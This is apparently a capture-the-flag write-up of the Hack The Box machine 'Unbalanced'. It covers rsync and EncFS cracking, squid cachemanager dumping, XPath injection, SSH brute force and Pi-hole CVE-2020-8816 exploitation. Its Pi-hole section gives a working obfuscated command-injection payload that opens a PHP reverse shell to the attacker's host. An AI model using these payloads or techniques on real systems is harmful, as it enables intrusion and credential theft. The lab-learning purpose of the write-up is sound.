![](unbalanced_banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="http://www.hackthebox.eu/badge/image/391067"></img></a>
</p>

||
|-----------|
|Start with Nmap found __rsync__ on port 873 and __squid-proxy__ on port 3128. Inside the rsync database found EncFS-encrypted configuration files backups. After decrypting the folder i found the __squid.conf__ file. In the config file i found a internal hostname and __squid-cachemanager__ password. with the use of __squidclient__ i dump *fqdncache* data from cachemanager and found more internal host ips. after founding the vulnerable host with the __XPath__ vulnerbility i dumped some user creds and found a working ssh cred and get the __User flag__. Inside the user home directory found a __TODO__ which specified that __Pi-hole__ is running in the local. after somw enumeration i found out that the running pi-hole version is vulnerable for remote code execution. i get the shell as __www-data__ user and from this user i can read some of the root directory files and form one of these files found the root password and get the __Root flag__.|

# Scanning

## Nmap

`ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.200 | grep open | awk -F / '{print $1}' ORS=',') echo $ports && nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.200`

```diff
PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+873/tcp  open  rsync      (protocol version 31)
+3128/tcp open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
```

## web_server!!

__Squid http proxy :__ Squid is a caching and forwarding HTTP web proxy. It has a wide variety of uses, including speeding up a web server by caching repeated requests, caching web, DNS and other computer network lookups for a group of people sharing network resources, and aiding security by filtering traffic.


* add this proxy in `foxyproxy`

__goto :__ `http://10.10.10.200`

__Error :__ Access Denied.

* i don't have any host that is allowed from the proxy so i can not get much information from here for now.


## rsync

rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification times and sizes of files. It is commonly found on Unix-like operating systems. Rsync is written in C as a single threaded application.

### rsync Enumeration

* list all directories -

	`rsync 10.10.10.200::`
	
	  conf_backups    EncFS-encrypted configuration backups

* copy `conf_backups` in local machine - 

	`rsync -av 10.10.10.200::conf_backups conf_backups`

* inside conf_backups directory

	  ❯ tree -a conf_backups
	  conf_backups
	  ├── 0K72OfkNRRx3-f0Y6eQKwnjn
	  <snippet>
	  └── ZXUUpn9SCTerl0dinZQYwxrx

	  0 directories, 75 files

  __folder is EncFS-encrypted of system configuration files backup.__

__EncFS :__ EncFS is a Free (LGPL) FUSE-based cryptographic filesystem. It transparently encrypts files, using an arbitrary directory as storage for the encrypted files. ... Files are encrypted using a volume key, which is stored either within or outside the encrypted source directory. A password is used to decrypt this key.

* in EncFS encryption all file name change into random text and create `.encfs6.xml` file that contains metadata of the encryption.

* searching on google i find out that johntheripper has a python script that extract password hash from `.encfs6.xml` file. 

### cracking EncFS-encrypted conf_backups Folder

* use encfs2john.py to extract hash

	`python3 /usr/share/john/encfs2john.py dump/conf_backups`

	  dump/conf_backups:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add

* crack hash using john

	`john -w=/usr/share/wordlists/rockyou.txt encfs_hash`

	  Using default input encoding: UTF-8
	  Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])

	  bubblegum        (conf_backups)

	  Session completed

  __Found Password :__ `bubblegum`

* decrypt conf_backups require [encfs](https://github.com/vgough/encfs) tool's __encfsctl__ utility which decrypt encfs filesystem.

	`encfsctl export conf_backups encfs_decrypt`

	  EncFS Password:	bubblegum

```diff
❯ tree -a encfs_decrypt
encfs_decrypt
├── 50-localauthority.conf
<snippet>
+── squid.conf
<snippet>
└── xattr.conf

0 directories, 74 files
```



## squid

### squid-proxy

*from the decrypted config files grep for `htb`*

  `grep -r htb`

    squid.conf:acl intranet dstdomain -n intranet.unbalanced.htb

__Internal Host :__ intranet.unbalanced.htb

* Host is found in `squid.conf` and then i rewind that there a Squid http proxy service running on port 873 in the box.
* i already add proxy in my browser and now found a host that can accessable from the proxy.
  * i can access to `intranet.unbalanced.htb` from `squid-proxy` i set in the foxyproxy, but i don't find anything intresting in host web page.

### [squid:CacheManager](https://wiki.squid-cache.org/Features/CacheManager)

*From the decrypted config files grep for `passwd`*

  `grep -r passwd`

    squid.conf:cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events

* found a `cachemgr_passwd` string in squid config file, reading the [squid config documents](http://www.squid-cache.org/Doc/config/) i found out that there are 2 part in the `cachemgr_passwd` string from [this doc](http://www.squid-cache.org/Doc/config/cachemgr_passwd/)

	  Usage: cachemgr_passwd password action action ...
	  
* in the squid config file `cachemgr_passwd` Specify passwords for cachemgr operations.
* `cachemgr_passwd` has tow part in it __First__ is *Password* and __second__ is *action* that are allowed on that passwd

* in this squid config file
  * __First :__ passwd: `Thah$Sh1`
  * __Second :__ actiions: `menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events`

* in [CacheManager](https://wiki.squid-cache.org/Features/CacheManager) documentation i found a tool [squidclient](https://wiki.squid-cache.org/SquidClientTool)__:__ *A command line utility for performing web requests. It also has a special ability to send cache manager requests to Squid proxies.*

# User Exploit

## [squidclient](https://linux.die.net/man/1/squidclient)

* from all specified actions in the config file i found some useful actions, [here](https://etutorials.org/Server+Administration/Squid.+The+definitive+guide/Chapter+14.+Monitoring+Squid/14.2+The+Cache+Manager/) is a good blog on CacheManager actions.

__Action :__ __[fqdncache](https://wiki.squid-cache.org/Features/CacheManager/FqdnCache) :__ This is a report of the Squid DNS cache for IP address resolution. this is same as iptable.

  `squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:fqdncache`
```diff
    HTTP/1.1 200 OK
    Server: squid/4.6
    Mime-Version: 1.0
    Date: Sat, 21 Nov 2020 04:52:08 GMT
    Content-Type: text/plain;charset=utf-8
    Expires: Sat, 21 Nov 2020 04:52:08 GMT
    Last-Modified: Sat, 21 Nov 2020 04:52:08 GMT
    X-Cache: MISS from unbalanced
    X-Cache-Lookup: MISS from unbalanced:3128
    Via: 1.1 unbalanced (squid/4.6)
    Connection: close

    FQDN Cache Statistics:
    FQDNcache Entries In Use: 11
    FQDNcache Entries Cached: 10
    FQDNcache Requests: 19292
    FQDNcache Hits: 0
    FQDNcache Negative Hits: 8790
    FQDNcache Misses: 10502
    FQDN Cache Contents:

    Address                                       Flg TTL Cnt Hostnames
    10.10.14.3                                     N  -36278   0
    127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
    ::1                                             H -001   3 localhost ip6-localhost ip6-loopback
+   172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
+   172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
    127.0.0.1                                       H -001   1 localhost
+   172.17.0.1                                      H -001   1 intranet.unbalanced.htb
    ff02::1                                         H -001   1 ip6-allnodes
    ff02::2                                         H -001   1 ip6-allrouters
    10.10.15.75                                    N  -47928   0
```

* Found 3 working Host IPs -

	  172.31.179.2
	  172.31.179.3
	  172.17.0.1

  but these IPs goes on same place (`/intranet.php`) where `intranet.unbalanced.htb` goes that i found before.

* All hosts have same login page with username and passworrd field.
* I try diffrent types of injection.
* I create a simple burp intruder list of diffrent injections from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) but none of them worked on any of these hosts.
  
  __*for intercepting internal Hosts request i set squid proxy `http://10.10.10.200:3128` as [upstream proxy](https://portswigger.net/support/burp-suite-upstream-proxy-servers) in burpSuite*__

* eventually i try for 172.31.179.1 and this give an error -

	  Host temporarily taken out of load balancing for security maintenance.
	  
  * i tried `172.31.179.1/intranet.php` as all Hosts redirected here and i got that same login page.

* again, i run my intruder list and this time i found a working injection in the password field.  

## XPATH injection [1](https://portswigger.net/kb/issues/00100600_xpath-injection) [2](https://owasp.org/www-community/attacks/XPATH_Injection)

__Passowrd field is vulnerable for xpath injection__

__XPathi Payload__

	' or '1'='1
	
* get some employees details

	  rita
	  Rita Fubelli
	  rita@unbalanced.htb
	  Role: HR Manager

	  jim
	  Jim Mickelson
	  jim@unbalanced.htb
	  Role: Web Designer

	  bryan
	  Bryan Angstrom
	  bryan@unbalanced.htb
	  Role: System Administrator

	  sarah
	  Sarah Goodman
	  sarah@unbalanced.htb
	  Role: Team Leader


* after some time on brupSuite testing XPath injection i found a way to extract password strings using xpath injection like sqli.

  __Payload :__ `' or Username='bryan'and substring(Password,$i,1)='$c`

* i create a bruteforce [script](exploit-scr/xpath_bf.py) that extract password from database using XPath vulnerability. __payload is worked like a sql boolean based injection.__ when `$i=$c` then page return `Username` contact details, and if `$i!=$c` then page return `Invalid credentials.`*where __i__ is a int and __c__ is a char*

  * it takes some time to extract all password form the database

__creds__
```
rita:password01!
jim:stairwaytoheaven
bryan:ireallyl0vebubblegum!!!
sarah:sarah4evah
```

## ssh bruteforce

`hydra -L usernames -P password 10.10.10.200 -t 4 ssh`
```diff
 [DATA] attacking ssh://10.10.10.200:22/
+[22][ssh] host: 10.10.10.200   login: bryan   password: ireallyl0vebubblegum!!!
 1 of 1 target successfully completed, 1 valid password found
```

__ssh-creds :__ `bryan:ireallyl0vebubblegum!!!`


## USER:bryan shell

`ssh bryan@10.10.10.200`
```diff
+bryan@10.10.10.200's password: ireallyl0vebubblegum!!!

Linux unbalanced 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

bryan@unbalanced:~$ cat user.txt
f91a0994************************
```

# Privesc enumeration

* in the bryan home folder there is a `TODO` file and inside the file there is a service specified that is running on localhost -

	  ###########
	  # Pi-hole #
	  ###########
	  * Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
	  * Set temporary admin password [DONE]
	  * Create Pi-hole configuration script [IN PROGRESS]
	  - Run Pi-hole configuration script [TODO]
	  - Expose Pi-hole ports to the network [TODO]

__[Pi-hole](https://pi-hole.net/) :__ Pi-hole is a Linux network-level advertisement and Internet tracker blocking application which acts as a DNS sinkhole and optionally a DHCP server, intended for use on a private network.

## enumerating Pi-hole

* check service port

	  bryan@unbalanced:~$ ss -lnpt | grep 127.0.0.1

	  LISTEN    0         128              127.0.0.1:8080             0.0.0.0:*
	  LISTEN    0         128              127.0.0.1:5553             0.0.0.0:*

  __Port 5553__ is not responding
  
  __Port 8080__ give an error
  
	  [ERROR]: Unable to parse results from queryads.php: Unhandled error message (Invalid domain!)

*setup ssh with tunnel*

__Gobuster__ 

`gobuster dir -u http://127.0.0.1:8080/ -w words -b 200`

*I use `-b` to ignore all 200 responses. because of that server's custom error every request give 200.*

__found :__ `/admin (Status: 301)`

* from the `http://127.0.0.1:8080/admin/` i got Pi-hole admin panel.

* I also find a Pi-hole's docker public IP that is accessible form squid-proxy -

  * linpeas scan -

	    [+] Networks and neighbours
	    10.10.10.2 dev ens160 lladdr 00:50:56:b9:16:1a REACHABLE
	    172.31.179.1 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:01 STALE
	    172.31.11.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:0b:03 STALE
	    fe80::250:56ff:feb9:161a dev ens160 lladdr 00:50:56:b9:16:1a router STALE
	    IP address       HW type     Flags       HW address            Mask     Device
	    10.10.10.2       0x1         0x2         00:50:56:b9:16:1a     *        ens160
	    172.31.179.1     0x1         0x2         02:42:ac:1f:b3:01     *        br-742fc4eb92b1
	    172.31.11.3      0x1         0x2         02:42:ac:1f:0b:03     *        br-742fc4eb92b1

    * these IPs are in the arp table `cat /proc/net/arp` -

	      IP address       HW type     Flags       HW address            Mask     Device
	      10.10.10.2       0x1         0x2         00:50:56:b9:16:1a     *        ens160
	      172.31.179.1     0x1         0x2         02:42:ac:1f:b3:01     *        br-742fc4eb92b1
	      172.31.11.3      0x1         0x2         02:42:ac:1f:0b:03     *        br-742fc4e	      

      __IP 172.31.179.1__ is the same XPath vulnerable host

      __IP 172.31.11.3__ is Pi-hole docker IP

* Access to `172.31.11.3` from squid-proxy gives Pi-hole admin console and here i found Pi-hole version is `4.3.2`
  
	  Pi-hole Version v4.3.2 Web Interface Version v4.3 FTL Version v4.3.1

* On the console i got a pi-hole hostname

	  pihole.unbalanced.htb

* login with temporary password:admin - login successful

* __IP:127.0.0.1__ and __IP: 172.31.11.3__ give same result because Pi-hole instance is accessible from both local and squid-proxy.

* search for Pi-hole 4.3.2 vulnerability i got an exploit from [ExploitDB](https://www.exploit-db.com/exploits/48727)


## Exploting Pi-hole

__Exploit Impact :__ Pi-hole Web v4.3.2 (aka AdminLTE) allows Remote Code Execution by privileged dashboard users via a crafted DHCP static lease.

__Exploit Reason :__ defining MAC address while configuring DHCP leases form pi-hole is not validate the mac address properly so one can manipulate that mac address field and put reverse shell and excute it.

__refer to [natedotred bolg](https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/) for complete exploitation process.__

__Goto__ Pi-hole Web-Console >> Admin-Panel >> Settings (login with Password:admin) >> DHCP tab

	http://172.31.11.3/admin/settings.php?tab=piholedhcp

* legitimate MAC address format should be as follows:

	  aaaaaaaaaaaa

* The MAC address input can be tampered to execute arbitrary code:

	  aaaaaaaaaaaa$PATH

* configure __DHCP leas__ with tampered MAC
	  
	  MAC address		IP address	Hostname	
	
	  aaaaaaaaaaaa$PATH 	10.10.10.200 	10.10.10.200

* got output like this:

	  MAC address										IP address	Hostname	
	
	  AAAAAAAAAAAA/opt/pihole:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 	10.10.10.200 	10.10.10.200

  pi-hole [`savesettings.php`](dump/savesettings.php) is responsible for this vulnerability.

__[lines 53-57](dump/savesettings.php#L53):__ The application first validates the MAC address format using the function preg_match().
```
function validMAC($mac_addr)
{
  // Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case)
  return (preg_match('/([a-fA-F0-9]{2}[:]?){6}/', $mac_addr) == 1);
}
```

__[lines 542-550](demp/savesettings.php#L542):__ then check only [html special characters](https://www.php.net/manual/en/function.htmlspecialchars.php) and converts the input to uppercase.
```
$mac = $_POST["AddMAC"];
if(!validMAC($mac))
{
	$error .= "MAC address (".htmlspecialchars($mac).") is invalid!<br>";
}
$mac = strtoupper($mac);
```

__[lines 588-592](dump/savesettings.php#L588):__ then adds the entry to DHCP using a pihole system command.
```
if(!strlen($error))
{
	exec("sudo pihole -a addstaticdhcp ".$mac." ".$ip." ".$hostname);
	$success .= "A new static address has been added";
}
```

__Exploit exception :__ MAC address input convert input data in upperCase letters and if we put shellcode in it. it converts all code in upperCase, As Linux commands are case sensitive, this would fail.

*the way to overcome this difficulty is to make use of __environment variables__ and __POSIX Shell__ Parameter Expansions.*

### Manual Exploit

#### payload Encoding 

__Reverse Shell Payload :__ `aaaaaaaaaaaa&&php -r ‘$sock=fsockopen(“tun0”,4141);exec(“/bin/sh -i <&3 >&3 2>&3”);’`

there are three peices in the payload

* __First__, MAC address `aaaaaaaaaaaa` use as it is.

* __Second__, environment variables, In the encoded shell command we define the $P, $H and $R shell parameters that contain their matching lower-case character with the following POSIX Shell Parameter Expansions:

__Example__

	❯ W=${PATH#/???/}
	echo $W
	bash:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
	❯ P=${W%%?????:*}
	echo $P
	p

__All variables:__

	W=${PATH#/???/}
	P=${W%%?????:}
	X=${PATH#/???/??}
	H=${X%%???:}
	Z=${PATH#:/??}
	R=${Z%%/}

  and now the payload looks life this: `<MAC>&&<variables>`
	
	  aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS
	  
  here `$IFS` is a default shell delimiter character which is a space.

__Third__, reverse shell code `'php -r \'$sock=fsockopen("tun0",4141);exec("/bin/sh -i <&3 >&3 2>&3");\''` in hex coded form, inside the php function - `’EXEC(HEX2BIN(“<shellcode>”));’&&`

* I use python to encode payload into hex - 

	  ❯ python2
	  Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
	  [GCC 9.3.0] on linux2
	  Type "help", "copyright", "credits" or "license" for more information.
	  >>> p = 'php -r \'$sock=fsockopen("tun0",4141);exec("/bin/sh -i <&3 >&3 2>&3");\''
	  >>> p.encode("hex").upper()
	  '706870202D72202724736F636B3D66736F636B6F70656E282231302E31302E31342E3437222C34313431293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27'

__Final payload :__ `aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("<shellcode>"));'&&`

__My Payload :__ `aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202D72202724736F636B3D66736F636B6F70656E282231302E31302E31342E3339222C34313431293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27"));'&&`

__Notes:__ Both IPs from squid-proxy `172.31.11.3` or with ssh tunnel on `127.0.0.1:8080` give a reverse shell as `www-data`

# Root Privesc

* user `www-data` is able to read `/root` dir

	  $ id
	  uid=33(www-data) gid=33(www-data) groups=33(www-data)
	  $ cd /root
	  $ pwd
	  /root
	  $ ls -la
	  -rw-r--r-- 1 root root 113876 Sep 20  2019 ph_install.sh
	  -rw-r--r-- 1 root root    485 Apr  6  2020 pihole_config.sh

* inside `pihole_config.sh` file 

	  $ cat pihole_config.sh
	  #!/bin/bash

	  # Add domains to whitelist
	  /usr/local/bin/pihole -w unbalanced.htb
	  /usr/local/bin/pihole -w rebalanced.htb

	  # Set temperature unit to Celsius
	  /usr/local/bin/pihole -a -c
  
	  # Add local host record
	  /usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1

	  # Set privacy level
	  /usr/local/bin/pihole -a -l 4

	  # Set web admin interface password
	  /usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'

	  # Set admin email
	  /usr/local/bin/pihole -a email admin@unbalanced.htb

* there is a Pi-hole admin password: __bUbBl3gUm$43v3Ry0n3!__ and su using this password from bryan's ssh shell worked and get root shell

	  bryan@unbalanced:~$ su - root
	  Password: bUbBl3gUm$43v3Ry0n3!
	  root@unbalanced:~# id
	  uid=0(root) gid=0(root) groups=0(root)
	  root@unbalanced:~# cat root.txt
	  8c97fa50************************
